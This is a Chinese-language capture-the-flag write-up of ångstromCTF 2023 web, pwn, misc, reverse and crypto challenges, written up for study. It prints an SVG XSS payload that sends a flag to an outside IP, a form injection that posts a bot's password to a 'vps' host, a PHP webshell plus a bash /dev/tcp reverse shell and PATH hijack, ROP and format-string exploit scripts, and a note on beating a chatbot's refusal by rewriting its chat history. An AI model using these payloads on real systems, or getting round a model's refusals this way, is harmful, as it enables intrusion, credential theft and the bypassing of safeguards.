# ångstromCTF 2023 WP

> 原文: https://www.ctfiot.com/112826.html
> ID: 112826

点击蓝字

关注我们

声明

本文作者：CTF战队本文字数：17248字

阅读时长：约40分钟

附件/链接：点击查看原文下载

本文属于【狼组安全社区】原创奖励计划，未经许可禁止转载

前言

ångstromCTF

CTF战队正在招新！

简历投至 match@wgpsec.org

WEB

catch me if you can

题目信息
image.png

题解

抓包在返回包里拿flag即可，签到题actf{y0u_caught_m3!_0101ff9abc2a724814dfd1c85c766afc7fbd88d2cdf747d8d9ddbf12d68ff874}

shortcircuit

题目信息
image.png

题解

源代码中存在js存在一个swap函数

const swap3 = (x) => {
                let t2 = x[3]
                x[3] = x[2]
                x[2] = t2

                t2 = x[1]
                x[1] = x[3]
                x[3] = t2

                                t2 = x[2]
                x[2] = x[1]
                x[1] = t2

                
                t2 = x[0]
                x[0] = x[3]
                x[3] = t2

                return x
            };
a=chunk("7e08250c4aaa9ed206fd7c9e398e2}actf{cl1ent_s1de_sucks_544e67ef12024523398ee02fe7517fffa92516317199e454f4d2bdb04d9e419ccc7", 30);
swap3(a).join("")

将swap函数的逻辑反写，得到flag

directory

题目信息
image.png

题解

http://directory.web.actf.co/

.html 从1-5000遍历id，第3054个html中得到flag

hallmark

题目信息
image.png

题解

用数组绕过判断

cards[id].type = type == "image/svg+xml" ? type : "text/plain";
cards[id].content = type === "image/svg+xml" ? IMAGES[svg || "heart"] : content;

写一个读 flag 页面的 http 请求

<svg xmlns="http://www.w3.org/2000/svg" version="1.1">
 <circle cx="100" cy="50" r="40" stroke="black" stroke-width="2" fill="red" />
 <script>xmlhttp=new XMLHttpRequest();xmlhttp.withCredentials=true;xmlhttp.onreadystatechange=function(){if(xmlhttp.readyState==4){window.open('http://118.31.164.133:5555/?flag=' + xmlhttp.responseText)}};xmlhttp.open('GET','https://hallmark.web.actf.co/flag',true);xmlhttp.send();</script>
</svg>

数据包，要记得url编码，不然会被解码

PUT /card HTTP/1.1
Host: hallmark.web.actf.co
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.88 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "Chromium";v="107", "Not=A?Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Referer: https://hallmark.web.actf.co/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 1385

id=c899ce6a-f5e8-4e42-ae5e-074f9c16c1c5&type[]=image/svg%2bxml&content=%3c%73%76%67%20%78%6d%6c%6e%73%3d%22%68%74%74%70%3a%2f%2f%77%77%77%2e%77%33%2e%6f%72%67%2f%32%30%30%30%2f%73%76%67%22%20%76%65%72%73%69%6f%6e%3d%22%31%2e%31%22%3e%0d%0a%20%20%20%3c%63%69%72%63%6c%65%20%63%78%3d%22%31%30%30%22%20%63%79%3d%22%35%30%22%20%72%3d%22%34%30%22%20%73%74%72%6f%6b%65%3d%22%62%6c%61%63%6b%22%20%73%74%72%6f%6b%65%2d%77%69%64%74%68%3d%22%32%22%20%66%69%6c%6c%3d%22%72%65%64%22%20%2f%3e%0d%0a%20%20%20%3c%73%63%72%69%70%74%3e%78%6d%6c%68%74%74%70%3d%6e%65%77%20%58%4d%4c%48%74%74%70%52%65%71%75%65%73%74%28%29%3b%78%6d%6c%68%74%74%70%2e%77%69%74%68%43%72%65%64%65%6e%74%69%61%6c%73%3d%74%72%75%65%3b%78%6d%6c%68%74%74%70%2e%6f%6e%72%65%61%64%79%73%74%61%74%65%63%68%61%6e%67%65%3d%66%75%6e%63%74%69%6f%6e%28%29%7b%69%66%28%78%6d%6c%68%74%74%70%2e%72%65%61%64%79%53%74%61%74%65%3d%3d%34%29%7b%77%69%6e%64%6f%77%2e%6f%70%65%6e%28%27%68%74%74%70%3a%2f%2f%31%31%38%2e%33%31%2e%31%36%34%2e%31%33%33%3a%35%35%35%35%2f%3f%66%6c%61%67%3d%27%20%2b%20%78%6d%6c%68%74%74%70%2e%72%65%73%70%6f%6e%73%65%54%65%78%74%29%7d%7d%3b%78%6d%6c%68%74%74%70%2e%6f%70%65%6e%28%27%47%45%54%27%2c%27%68%74%74%70%73%3a%2f%2f%68%61%6c%6c%6d%61%72%6b%2e%77%65%62%2e%61%63%74%66%2e%63%6f%2f%66%6c%61%67%27%2c%74%72%75%65%29%3b%78%6d%6c%68%74%74%70%2e%73%65%6e%64%28%29%3b%3c%2f%73%63%72%69%70%74%3e%0d%0a%3c%2f%73%76%67%3e

brokenlogin

题目信息
image.png

题解

看起来 bot 会输入用户名和密码，在25字节内的代码把它的输入转发出去

if len(request.args["message"]) >= 25:

Admin bot的代码用了Puppeteer库。首先判断输入URL是否满足/^https://brokenlogin.web.actf.co/.*/，满足才能进入功能逻辑。

#https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/RegExp/test

if (!/^https://brokenlogin.web.actf.co/.*/.test(url)) return;

这段代码，admin bot会将flag填入到password表单字段中。最后提交给某个url。

#https://pptr.dev/api/puppeteer.page._eval
await page.$eval(
          "input[name=password]",
          (el, password) => (el.value = password),
          process.env.CHALL_BROKENLOGIN_FLAG
        );

所以关键点在于如何抓到admin bot提交表单中的password字段值 得到flag。

Login page的代码使用flask框架，jinja2模板引擎 用户输入的message参数值会被escape函数转移后，输出到页面。escape函数会将字符& < > ' "转换为HTML实体编码，这里没法XSS。但message值可直接进行模板注入：[https://brokenlogin.web.actf.co/?message={{2*3}}](https://brokenlogin.web.actf.co/?message={{2*3}})

    if "message" in request.args:
        if len(request.args["message"]) >= 25:
            return render_template_string(indexPage, fails=fails)
        
        custom_message = escape(request.args["message"])
    
    return render_template_string(indexPage % custom_message, fails=fails)

XSS

?message={{request.args|safe}}&<script>alert(1)</script>

payload

https://brokenlogin.web.actf.co/?message={{request.args|safe}}&r=%3Cform%20action=%22http://vps/%22%20method=%22POST%22%3E%3Clabel%20for=%22username%22%3EUsername:%20%3C/label%3E%3Cinput%20id=%22username%22%20type=%22text%22%20name=%22username%22%20/%3E%3Cbr%20/%3E%3Cbr%20/%3E%3Clabel%20for=%22password%22%3EPassword:%20%3C/label%3E%3Cinput%20id=%22password%22%20type=%22password%22%20name=%22password%22%20/%3E%3Cbr%20/%3E%3Cbr%20/%3E%3Cinput%20type=%22submit%22%20/%3E%3C/form%3E%3C!--

image.png

Celeste Speedrunning Association

题目信息
image.png

题解

时间戳溢出 https://mount-tunnel.web.actf.co/play  抓取/play下请求包 点击按钮可以看到发送了一个时间戳百度搜时间戳最大值大致范围内都可以获得flag

Celeste Tunneling Association

HOST 头只有一个且值为 “flag.local”，则发送包含 FLAG 值的响应

if num_hosts == 1:
    for name, value in headers:
        if name == b"host" and value == SECRET_SITE:
            await send({
                'type': 'http.response.body',
                'body': FLAG.encode(),
            })
            return

GET / HTTP/2
Host: flag.local
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Referer: https://2023.angstromctf.com/
Dnt: 1
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: cross-site
Sec-Fetch-User: ?1
Te: trailers

filestore

题目信息
image.png

题解

原装php docker, 打include RCE, burp发包

GET /?+config-create+/&f=../../../../usr/local/lib/php/pearcmd.php&/<?=eval($_GET[1])?>+/tmp/shell.php HTTP/1.1

反弹shell

?f=../../../../tmp/shell.php&1=echo `bash%20%2Dc%20%27bash%20%2Di%20%3E%26%20%2Fdev%2Ftcp%2Fvps%200%3E%261%27`;

然后 /list_uploads 以 admin 权限执行 ls 用环境变量替换直接打，虽然没有chown和chmod但是有cp，cp一个可执行文件然后打 tmp下本身就有可执行文件sh （这个思路感觉是非预期，但是他给的没看太懂）

cp /tmp/sh /tmp/ls;
echo "/bin/cat /flag.txt > /tmp/test" > /tmp/ls;
export PATH=/tmp:$PATH;
/list_uploads;
cat /tmp/test;

image.png

Pwn

queue

题目信息
image.png

题解

#!/usr/bin/env python3
from pwncli import *
cli_script()

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

filename  = gift.filename # current filename
is_debug  = gift.debug # is debug or not 
is_remote = gift.remote # is remote or not
gdb_pid   = gift.gdb_pid # gdb pid if debug

pd = ''
for i in range(10,0x20):
    pd += '%' + str(i) + '$p'
sla("today?",pd)

#0x312570243831250x3474737b667463610x75715f74695f6b630x615f74695f6575650x34373964613931360x7d32326234363863
#1%p$81%4ts{ftcauq_ti_kca_ti_eue479da916}22b468c
#4ts{ ftca -> actf{st4
#uq_t i_kc -> ck_it_qu
#a_ti _eue -> eue_it_a
# 479d a916 -> 619ad974
# }22b 468c -> c864b22}
#actf{st4ck_it_queue_it_a619ad974c864b22}
ia()

gaga

题目信息
image.png

题解

#!/usr/bin/env python3

from pwncli import *
cli_script()

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

filename  = gift.filename # current filename
is_debug  = gift.debug # is debug or not 
is_remote = gift.remote # is remote or not
gdb_pid   = gift.gdb_pid # gdb pid if debug

CurrentGadgets.set_find_area(1,0)
pd = flat(
    {
    72:[
    CurrentGadgets.write_by_magic(0x404050,0,0x6873),
    CurrentGadgets.write_by_magic(elf.got.setbuf,libc.sym.setbuf,libc.sym.system),
    CurrentGadgets.ret(),
    CurrentGadgets.pop_rdi_ret(),
    0x404050,
    elf.plt.setbuf
    ]
    }
)

sla('input:',pd)
ia()
#actf{b4by's_f1rst_pwn!_3857ffd6bfdf775e}

widget

题目信息
image.png

题解

本地打得通，远程不行，?泄露的libc也没问题… 思路；往栈上写got然后利用 %s泄露got中的libc地址 然后栈溢出控制rbp和rip到地址0x401449处，往bss段写，并会完成栈迁移（leave ret），然后迁移后的栈就是0x401449处可写的…执行rop链，但是远程打不通…

#!/usr/bin/env python3
import subprocess
from pwncli import *
cli_script()

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

filename  = gift.filename # current filename
is_debug  = gift.debug # is debug or not 
is_remote = gift.remote # is remote or not
gdb_pid   = gift.gdb_pid # gdb pid if debug

if gift.remote:
    libc = ELF("./libc.so.6")
    gift[libc] = libc

def execute_curl_command():
    ru('proof of work: ')
    fxxk = rl()[:-1]
    command = (fxxk)
    output = subprocess.check_output(command, shell=True)
    return output.decode("utf-8").strip()
sla('solution:',execute_curl_command())

sla('Amount: ','48')

sa('Contents: ',flat(
    {
    0:'%10$s',
    16:elf.got.printf,
    40-8:[
    0x404000+0xd00,
    0x401449
    ]
    }
))
ru('Your input: ')
leak_libc = recv_current_libc_addr()
log_address_ex2(leak_libc)
lb = leak_libc - libc.sym.printf
libc.address = lb
log_address_ex2(lb)
sleep(2)

CurrentGadgets.set_find_area(0,1)
s(flat(
    {
    40:[
    CurrentGadgets.execve_chain()
    
    ]
    }
))

ia()

原来是走别的路

#!/usr/bin/env python3
import subprocess
from pwncli import *
cli_script()

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

filename  = gift.filename # current filename
is_debug  = gift.debug # is debug or not 
is_remote = gift.remote # is remote or not
gdb_pid   = gift.gdb_pid # gdb pid if debug

if gift.remote:
    libc = ELF("./libc.so.6")
    gift[libc] = libc

def execute_curl_command():
    ru('proof of work: ')
    fxxk = rl()[:-1]
    command = (fxxk)
    output = subprocess.check_output(command, shell=True)
    return output.decode("utf-8").strip()
sla('solution:',execute_curl_command())

sla('Amount: ','48')

sa('Contents: ',flat(
    {
    40-8:[
    0x404020+0x90,
    0x40130B,

    ]
    }
))

ia()

slack

本地通了

#!/usr/bin/env python3

from pwncli import *
cli_script()

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

filename  = gift.filename # current filename
is_debug  = gift.debug # is debug or not 
is_remote = gift.remote # is remote or not
gdb_pid   = gift.gdb_pid # gdb pid if debug

def attack(retstack,val):
    #%57$
    for i in range(6):
        attack_val = val&0xff
        val = val >> 8
        pd = flat(
        {
            0:['%55$hhn']
        },filler = 'x00'
        )
        sleep(0.02)

        sla('Professional): ',pd)
        pd = flat(
        {
            0:'%' + str(retstack+i&0xff) + 'c' + '%42$hhn'
        },filler = 'x00'
        )
        sla('Professional):',pd)
        pd = flat(
        {
            0:['%55$hhnx0a']
        },filler = 'x00'
        )
        sa('Professional):',pd)
        log_address_ex2(attack_val)
        pd = flat(
        {
            0:'%' + str(attack_val) + 'c' + '%57$hhnx0a'
        },filler = 'x00'
        )
        sa('Professional):',pd)
        

pd = flat(
    {
    0:'%28$p-%21$p'
    },filler = 'x00'
    )
sleep(0.05)
sla('Professional):',pd)
ru('You: ')
leak_stack = int(ru('-')[:-1],16)
attack_stack = leak_stack - 0x180

leak_libc= int(rl()[:-1],16)
log_address_ex2(leak_libc)
lb = leak_libc - 0x29d90
libc.address = lb
log_address_ex2(lb)
sleep(0.05)
pd = flat(
    {
    0:'%' + str(attack_stack&0xffff) + 'c' + '%28$hn'
    },filler = 'x00',length = 13
    )
sa('Professional):',pd)
sleep(1)
#%55$p
pd = flat(
        {
        0:['%55$hhn']
        },filler = 'x00'
    )
sla('Professional):',pd)
sleep(0.05)
retstack = leak_stack - 0x110
pd = flat(
    {
    0:'%' + str(retstack&0xffff) + 'c' + '%42$hn'
    },filler = 'x00'
    )
sa('Professional):',pd)
sleep(0.05)
pd = flat(
        {
        0:['%55$hhn']
        },filler = 'x00'
    )
sla('Professional):',pd)
CurrentGadgets.set_find_area(0,1)

pd = CurrentGadgets.pop_rdi_ret()
attack(retstack,pd)

pd = libc.search(b'/bin/shx00').__next__()
attack(retstack+8,pd)

pd = CurrentGadgets.ret()
attack(retstack+0x10,pd)
pd = libc.sym.system
attack(retstack+0x18,pd)

sl('0')

ia()

Misc

meow

题目信息
image.png

题解

nc连上就有flag

Physics HW

题目信息
image.png

题解

下载附件能看到这个图片下面有空白的内容大多数情况下都是lsb隐写提取R0 G0 B0三个通道

Admiral Shark

题目信息
image.png

题解

题目中只有TCP流量是在内网传输的追踪TCP流 存在对话

在第二个流 发现存在一个excel文件提取该文件，打开excel获得结果

Simon Says

题目信息
image.png

题解

题目是批量修改，提取字符串拼接成新字符串。但是运行一会就会出问题。卡在这里

from socket import timeout
from pwn import *

HOST = 'challs.actf.co'
PORT = 31402

def combine_strings(str1, str2):
 return str1[:3] + str2[-3:]

# 连接到服务器
conn = remote(HOST, PORT)

# 处理数据并发送结果
try:
 while True:
 data = conn.recvline().decode().strip()
 if not data:
 break
 print(data)

 match = re.search(r'of (.*) with the last 3 letters of (.*)', data)
 if match:
 re_str1 = match.group(1)
 re_str2 = match.group(2)
 print(re_str1)
 print(re_str2)
 # 结合两个字符串
 new_string = combine_strings(re_str1, re_str2)
 print(new_string)
 #timeout(1)
 # 发送新字符串到服务器
 conn.sendline(new_string.encode())

 
except Exception as e:
 print(f"Exception: {e}")
 print("Last message from server:")
 #data2 = conn.recvline().decode().strip()
 print(conn.recvall())

# 关闭连接
conn.close()

优化了很多次代码还是发现不行，使用美国服务器 100M拉满就出了

Butter me

题目信息
image.png

题解

机器人的对话逻辑可能会参考history，而且这里history是可以修改的，直接管他要flag会被拒绝，然后把他拒绝的内容变成同意，再次要flag即可得到。

Reverse

checkers

题目信息
image.png

题解

反编译直接打开就有flag

zaza

题目信息
image.png

题解

共3个关卡，全部通过则输出flag最后一个关卡异或即可得到

win这里可以输出flag

from pwn import *
p = remote('challs.actf.co',32760)

p.sendlineafter('sheep: ','4919')
p.sendlineafter("you can't: ",'1')
a = 'anextremelycomplicatedkeythatisdefinitelyuselessss'
b = "2& =$!-( <*+*( ?!&$$6,. )' $19 , #9=!1 <*=6 <6;66#"

c = ''
for i in range(len(a)):
    c += chr(ord(a[i])^ord(b[i]))
p.sendlineafter('word?n',c)

p.interactive()

image.png

Crypto

ranch

题目信息
image.png

题解

凯撒 17位

actf{lo0ks_like_we'll_h4ve_to_try_an0ther_dress1ng_5ef89b3a44901831}

impossible

题目信息

源代码

#!/usr/local/bin/python

def fake_psi(a, b):
    return [i for i in a if i in b]

def zero_encoding(x, n):
    ret = []

    for i in range(n):
        if (x & 1) == 0:
            ret.append(x | 1)

        x >>= 1

    return ret

def one_encoding(x, n):
    ret = []

    for i in range(n):
        if x & 1:
            ret.append(x)

        x >>= 1

    return ret

print("Supply positive x and y such that x < y and x > y.")
x = int(input("x: "))
y = int(input("y: "))

if len(fake_psi(one_encoding(x, 64), zero_encoding(y, 64))) == 0 and x > y and x > 0 and y > 0:
    print(open("flag.txt").read())

题解

简单的判定，但是可以发现只判断了后64位，我们可以利用这一缺陷去绕过，一个传265，另一个传265-1即可

Royal Society of Arts

题目信息

源代码

from Crypto.Util.number import getStrongPrime, bytes_to_long
f = open("flag.txt").read()
m = bytes_to_long(f.encode())
p = getStrongPrime(512)
q = getStrongPrime(512)
n = p*q
e = 65537
c = pow(m,e,n)
print("n =",n)
print("e =",e)
print("c =",c)
print("(p-2)*(q-1) =", (p-2)*(q-1))
print("(p-1)*(q-2) =", (p-1)*(q-2))

题解

简单的公式推导一下就可以分解n，然后解RSA即可

n = 125152237161980107859596658891851084232065907177682165993300073587653109353529564397637482758441209445085460664497151026134819384539887509146955251284230158509195522123739130077725744091649212709410268449632822394998403777113982287135909401792915941770405800840172214125677106752311001755849804716850482011237
e = 65537
c = 40544832072726879770661606103417010618988078158535064967318135325645800905492733782556836821807067038917156891878646364780739241157067824416245546374568847937204678288252116089080688173934638564031950544806463980467254757125934359394683198190255474629179266277601987023393543376811412693043039558487983367289
h1 = 125152237161980107859596658891851084232065907177682165993300073587653109353529564397637482758441209445085460664497151026134819384539887509146955251284230125943565148141498300205893475242956903188936949934637477735897301870046234768439825644866543391610507164360506843171701976641285249754264159339017466738250
h2 = 125152237161980107859596658891851084232065907177682165993300073587653109353529564397637482758441209445085460664497151026134819384539887509146955251284230123577760657520479879758538312798938234126141096433998438004751495264208294710150161381066757910797946636886901614307738041629014360829994204066455759806614
a=n-h1+2
b=2*(n-h2)+4
import gmpy2
p=gmpy2.gcd(b-a,n)
q=n//p
d=gmpy2.invert(e,(p-1)*(q-1))
m=pow(c,d,n)
from Crypto.Util.number import *
print(long_to_bytes(m))
#actf{tw0_equ4ti0ns_in_tw0_unkn0wns_d62507431b7e7087}

Royal Society of Arts 2

题目信息

源代码

from Crypto.Util.number import getStrongPrime, bytes_to_long, long_to_bytes
f = open("flag.txt").read()
m = bytes_to_long(f.encode())
p = getStrongPrime(512)
q = getStrongPrime(512)
n = p*q
e = 65537
c = pow(m,e,n)
print("n =",n)
print("e =",e)
print("c =",c)

d = pow(e, -1, (p-1)*(q-1))

c = int(input("Text to decrypt: "))

if c == m or b"actf{" in long_to_bytes(pow(c, d, n)):
    print("No flag for you!")
    exit(1)

print("m =", pow(c, d, n))

题解

典型的选择密文攻击

from Crypto.Util.number import *
n = 125599176571600020653591006850671918629969316481963062048627899456165392819660860740063083701116993746821677119724732749154516815660187428871607902333403883531995982511670779222688750122385320108285448513711360492525583823239144738204403791494094189914263158329757646207097685944406086316650210435629015580441
e = 65537
c = 118356699644273181014656096442468434092741953493535637242089038822421604090520338228951532311310670264465550052347866421933804678431771754308403610411364147164144986161358033438786432298384562234382847670449017346123112400553187892435784965521706143303825780409089666411990538839432926212604876110990468222147
def get_M():
    X = 31
    Y = 2245210353507115744853619512763365103513604203252345078552352164656244721761498436382540411511342605064367502059224782489794482885805847835150166633217981938173524890815767043000942837015297824912761101682532115739430712588817915577317506214466354298172138616710257304537044994467111779824460332769762294569
    Z = 1815130072598125153013806999324629484146992932282840740577392431166379221925559013496695934091738262155265245310243
    i = 0
    while True:
        M = (n * i + Z) // X
        if b'actf{' in long_to_bytes(M):
            print(long_to_bytes(M))
            break
get_M()
#actf{rs4_is_sorta_homom0rphic_50c8d344df58322b}

Lazy Lagrange

题目信息
image.png

题解

给的是多项式的和，然后mod了M，由于flag字符是可见字符并且测试之后发现”}”是最大的一个字符，将底数设置成127，即可保证mod M不生效并且不会在计算中影响系数a

from pwn import *
def jisuan(o,a0,M):
    p=''
    p+=str(a0)+' '
    for i in range(17):
        o=(o-a0)//M
        a0=o%M
        p+=str(a0)+' '
    return p
M = 127
r=remote('challs.actf.co',32100)
print(r.recv())
r.sendline(b'1')
print(r.recv())
r.sendline(b'0 127')
a0=int(r.recvline())
a1=int(r.recvline())
print(a0,a1)
p=jisuan(a1,a0,M)
print(p)
print(r.recv())
r.sendline(b'2')
print(r.recv())
r.sendline(p.encode())
print(r.recv())
a=[56 ,102 ,102 ,102 ,48 ,99 ,97 ,116 ,48 ,98 ,56 ,125 ,55 ,97 ,55 ,54 ,123 ,54 ]
b=[6 ,5 ,3 ,8 ,7, 1 ,13 ,2 ,10 ,16 ,11 ,17 ,14 ,0 ,15 ,12, 4 ,9]
c=[0]*18
flag=''
for i in range(len(a)):
    c[b[i]]=chr(a[i])
for k in c:
    flag+=k
print(flag)
#actf{f80f6086a77b}

作者

CTF战队

ctf.wgpsec.org

扫描关注公众号回复加群

和师傅们一起讨论研究~

长

按

关

注

WgpSec狼组安全团队

微信号：wgpsec

Twitter：@wgpsec


```
const swap3 = (x) => {
                let t2 = x[3]
                x[3] = x[2]
                x[2] = t2

                t2 = x[1]
                x[1] = x[3]
                x[3] = t2

                                t2 = x[2]
                x[2] = x[1]
                x[1] = t2

                
                t2 = x[0]
                x[0] = x[3]
                x[3] = t2

                return x
            };
a=chunk("7e08250c4aaa9ed206fd7c9e398e2}actf{cl1ent_s1de_sucks_544e67ef12024523398ee02fe7517fffa92516317199e454f4d2bdb04d9e419ccc7", 30);
swap3(a).join("")
```



```
cards[id].type = type == "image/svg+xml" ? type : "text/plain";
cards[id].content = type === "image/svg+xml" ? IMAGES[svg || "heart"] : content;
```



```
<svg xmlns="http://www.w3.org/2000/svg" version="1.1">
 <circle cx="100" cy="50" r="40" stroke="black" stroke-width="2" fill="red" />
 <script>xmlhttp=new XMLHttpRequest();xmlhttp.withCredentials=true;xmlhttp.onreadystatechange=function(){if(xmlhttp.readyState==4){window.open('http://118.31.164.133:5555/?flag=' + xmlhttp.responseText)}};xmlhttp.open('GET','https://hallmark.web.actf.co/flag',true);xmlhttp.send();</script>
</svg>
```



```
PUT /card HTTP/1.1
Host: hallmark.web.actf.co
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.88 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "Chromium";v="107", "Not=A?Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Referer: https://hallmark.web.actf.co/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 1385

id=c899ce6a-f5e8-4e42-ae5e-074f9c16c1c5&type[]=image/svg%2bxml&content=%3c%73%76%67%20%78%6d%6c%6e%73%3d%22%68%74%74%70%3a%2f%2f%77%77%77%2e%77%33%2e%6f%72%67%2f%32%30%30%30%2f%73%76%67%22%20%76%65%72%73%69%6f%6e%3d%22%31%2e%31%22%3e%0d%0a%20%20%20%3c%63%69%72%63%6c%65%20%63%78%3d%22%31%30%30%22%20%63%79%3d%22%35%30%22%20%72%3d%22%34%30%22%20%73%74%72%6f%6b%65%3d%22%62%6c%61%63%6b%22%20%73%74%72%6f%6b%65%2d%77%69%64%74%68%3d%22%32%22%20%66%69%6c%6c%3d%22%72%65%64%22%20%2f%3e%0d%0a%20%20%20%3c%73%63%72%69%70%74%3e%78%6d%6c%68%74%74%70%3d%6e%65%77%20%58%4d%4c%48%74%74%70%52%65%71%75%65%73%74%28%29%3b%78%6d%6c%68%74%74%70%2e%77%69%74%68%43%72%65%64%65%6e%74%69%61%6c%73%3d%74%72%75%65%3b%78%6d%6c%68%74%74%70%2e%6f%6e%72%65%61%64%79%73%74%61%74%65%63%68%61%6e%67%65%3d%66%75%6e%63%74%69%6f%6e%28%29%7b%69%66%28%78%6d%6c%68%74%74%70%2e%72%65%61%64%79%53%74%61%74%65%3d%3d%34%29%7b%77%69%6e%64%6f%77%2e%6f%70%65%6e%28%27%68%74%74%70%3a%2f%2f%31%31%38%2e%33%31%2e%31%36%34%2e%31%33%33%3a%35%35%35%35%2f%3f%66%6c%61%67%3d%27%20%2b%20%78%6d%6c%68%74%74%70%2e%72%65%73%70%6f%6e%73%65%54%65%78%74%29%7d%7d%3b%78%6d%6c%68%74%74%70%2e%6f%70%65%6e%28%27%47%45%54%27%2c%27%68%74%74%70%73%3a%2f%2f%68%61%6c%6c%6d%61%72%6b%2e%77%65%62%2e%61%63%74%66%2e%63%6f%2f%66%6c%61%67%27%2c%74%72%75%65%29%3b%78%6d%6c%68%74%74%70%2e%73%65%6e%64%28%29%3b%3c%2f%73%63%72%69%70%74%3e%0d%0a%3c%2f%73%76%67%3e
```



```
if len(request.args["message"]) >= 25:
```



```
#https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/RegExp/test

if (!/^https://brokenlogin.web.actf.co/.*/.test(url)) return;
```



```
#https://pptr.dev/api/puppeteer.page._eval
await page.$eval(
          "input[name=password]",
          (el, password) => (el.value = password),
          process.env.CHALL_BROKENLOGIN_FLAG
        );
```



```
if "message" in request.args:
        if len(request.args["message"]) >= 25:
            return render_template_string(indexPage, fails=fails)
        
        custom_message = escape(request.args["message"])
    
    return render_template_string(indexPage % custom_message, fails=fails)
```



```
?message={{request.args|safe}}&<script>alert(1)</script>
```



```
https://brokenlogin.web.actf.co/?message={{request.args|safe}}&r=%3Cform%20action=%22http://vps/%22%20method=%22POST%22%3E%3Clabel%20for=%22username%22%3EUsername:%20%3C/label%3E%3Cinput%20id=%22username%22%20type=%22text%22%20name=%22username%22%20/%3E%3Cbr%20/%3E%3Cbr%20/%3E%3Clabel%20for=%22password%22%3EPassword:%20%3C/label%3E%3Cinput%20id=%22password%22%20type=%22password%22%20name=%22password%22%20/%3E%3Cbr%20/%3E%3Cbr%20/%3E%3Cinput%20type=%22submit%22%20/%3E%3C/form%3E%3C!--
```



```
if num_hosts == 1:
    for name, value in headers:
        if name == b"host" and value == SECRET_SITE:
            await send({
                'type': 'http.response.body',
                'body': FLAG.encode(),
            })
            return
```



```
GET / HTTP/2
Host: flag.local
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Referer: https://2023.angstromctf.com/
Dnt: 1
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: cross-site
Sec-Fetch-User: ?1
Te: trailers
```



```
GET /?+config-create+/&f=../../../../usr/local/lib/php/pearcmd.php&/<?=eval($_GET[1])?>+/tmp/shell.php HTTP/1.1
```



```
?f=../../../../tmp/shell.php&1=echo `bash%20%2Dc%20%27bash%20%2Di%20%3E%26%20%2Fdev%2Ftcp%2Fvps%200%3E%261%27`;
```



```
cp /tmp/sh /tmp/ls;
echo "/bin/cat /flag.txt > /tmp/test" > /tmp/ls;
export PATH=/tmp:$PATH;
/list_uploads;
cat /tmp/test;
```



```
#!/usr/bin/env python3
from pwncli import *
cli_script()

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

filename  = gift.filename # current filename
is_debug  = gift.debug # is debug or not 
is_remote = gift.remote # is remote or not
gdb_pid   = gift.gdb_pid # gdb pid if debug

pd = ''
for i in range(10,0x20):
    pd += '%' + str(i) + '$p'
sla("today?",pd)

#0x312570243831250x3474737b667463610x75715f74695f6b630x615f74695f6575650x34373964613931360x7d32326234363863
#1%p$81%4ts{ftcauq_ti_kca_ti_eue479da916}22b468c
#4ts{ ftca -> actf{st4
#uq_t i_kc -> ck_it_qu
#a_ti _eue -> eue_it_a
# 479d a916 -> 619ad974
# }22b 468c -> c864b22}
#actf{st4ck_it_queue_it_a619ad974c864b22}
ia()
```



```
#!/usr/bin/env python3

from pwncli import *
cli_script()

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

filename  = gift.filename # current filename
is_debug  = gift.debug # is debug or not 
is_remote = gift.remote # is remote or not
gdb_pid   = gift.gdb_pid # gdb pid if debug

CurrentGadgets.set_find_area(1,0)
pd = flat(
    {
    72:[
    CurrentGadgets.write_by_magic(0x404050,0,0x6873),
    CurrentGadgets.write_by_magic(elf.got.setbuf,libc.sym.setbuf,libc.sym.system),
    CurrentGadgets.ret(),
    CurrentGadgets.pop_rdi_ret(),
